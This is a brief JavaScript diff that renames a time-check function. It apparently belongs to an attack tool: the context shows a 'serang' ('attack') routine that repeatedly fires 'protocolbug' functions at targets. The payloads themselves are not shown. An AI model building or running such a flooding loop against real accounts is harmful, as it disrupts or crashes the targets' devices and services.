@@ -328,7 +328,7 @@ function trashprotocol(target) {
   });
 }
 
-const cekjam= function() {
+function cekJam() {
   const jam = new Date().getHours();
   const menit = new Date().getMinutes();
   if (jam > 21 || jam < 5 || (jam >= 21 && menit >= 45) || (jam <= 5 && menit <= 15)) {
@@ -339,7 +339,7 @@ const cekjam= function() {
 function serang(targets) {
   return new Promise(async resolve => {
     for (let i = 1; i <= 35; i++) {
-      cekjam();
+      cekJam();
       await protocolbug5(targets);
       await tunggu(1500);
       await protocolbug3(targets);
